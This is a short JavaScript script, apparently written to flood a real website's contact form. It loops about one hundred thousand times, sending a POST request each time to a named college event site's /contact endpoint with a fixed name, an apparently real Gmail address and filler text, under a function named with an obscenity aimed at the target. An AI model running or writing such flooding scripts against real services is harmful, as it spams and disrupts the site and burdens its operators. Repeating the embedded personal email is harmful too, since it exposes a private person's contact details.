import axios from "axios";

async function fuckThem() {
  for (let i = 0; i <= 100000; i++) {
    const resp = await axios.post("https://itrix.istaceg.in/contact", {
      name: "kumaran",
      email: "kumaranb577@gmail.com",
      subject: "as fuck",
      message: "done",
    });
    console.log(resp.data);
  }
}

fuckThem();
